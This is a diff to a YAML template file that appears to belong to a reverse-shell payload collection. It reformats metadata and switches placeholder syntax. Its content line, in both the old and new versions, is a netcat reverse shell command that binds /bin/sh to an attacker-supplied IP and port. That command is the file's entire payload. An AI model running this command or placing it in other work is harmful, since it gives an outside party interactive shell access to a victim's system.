@@ -1,9 +1,10 @@
----
 metadata:
-  filename: "revshell-linux-nc.yaml"
-  tags: ["shell", "linux"]
-  created: "2025-03-29"
-  author: "Unknown"
+  filename: revshell-linux-nc.yaml
+  tags:
+  - shell
+  - linux
+  created: '2025-03-29'
+  author: Unknown
+content: 'nc -e /bin/sh {{ attacker_ip }} {{ shell_port }}
 
-content: |
-  nc -e /bin/sh <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%>
+  '
